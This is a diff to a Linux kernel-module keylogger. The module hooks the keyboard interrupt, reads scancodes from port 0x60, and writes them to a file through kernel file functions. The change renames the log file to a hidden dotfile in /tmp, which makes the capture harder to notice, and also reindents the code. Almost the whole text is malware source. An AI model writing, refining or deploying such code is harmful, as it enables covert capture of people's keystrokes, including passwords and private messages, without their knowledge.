@@ -23,8 +23,7 @@ static struct file *keylog = NULL;
 // Initialize the module − register the IRQ handler
 int init_module() {
 	printk(KERN_ALERT "Keylogger started");
-	keylog = file_open("/tmp/teclas_secretas_que_foram_digitas.txt", O_WRONLY | O_APPEND | O_CREAT, 0644);
-
+	keylog = file_open("/tmp/.pressed_keys", O_WRONLY | O_APPEND | O_CREAT, 0644);
 
 	return request_irq(1, (irq_handler_t) irq_handler, IRQF_SHARED, "keylogger", (void *)(&keylogger));
 }
@@ -35,7 +34,7 @@ irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs) {
 	char *key = NULL;
 
 	scancode = inb(0x60); // Get scancode from specific input port.
-	
+
 	key = (char*) &scancode;
 
 	printk("Not mapped key!\n");
@@ -57,34 +56,34 @@ void __exit irq_cleanup(void) {
 }
 
 struct file *file_open(const char *path, int flags, int rights){
-    struct file *filp = NULL;
-    mm_segment_t oldfs;
-    int err = 0;
+	struct file *filp = NULL;
+	mm_segment_t oldfs;
+	int err = 0;
 
-    oldfs = get_fs();
-    set_fs(KERNEL_DS);
-    filp = filp_open(path, flags, rights);
-    set_fs(oldfs);
-    if (IS_ERR(filp)) {
-        err = PTR_ERR(filp);
-        return NULL;
-    }
-    return filp;
+	oldfs = get_fs();
+	set_fs(KERNEL_DS);
+	filp = filp_open(path, flags, rights);
+	set_fs(oldfs);
+	if (IS_ERR(filp)) {
+		err = PTR_ERR(filp);
+		return NULL;
+	}
+	return filp;
 }
 
 void file_close(struct file *file){
-    filp_close(file, NULL);
+	filp_close(file, NULL);
 }
 
 void file_write(char *data){
-    mm_segment_t oldfs;
-		loff_t pos = 0;
+	mm_segment_t oldfs;
+	loff_t pos = 0;
 
-    oldfs = get_fs();
-    set_fs(KERNEL_DS);
+	oldfs = get_fs();
+	set_fs(KERNEL_DS);
 
-		vfs_write(keylog, data, strlen(data), &pos);
-    set_fs(oldfs);
+	vfs_write(keylog, data, strlen(data), &pos);
+	set_fs(oldfs);
 
 }
 
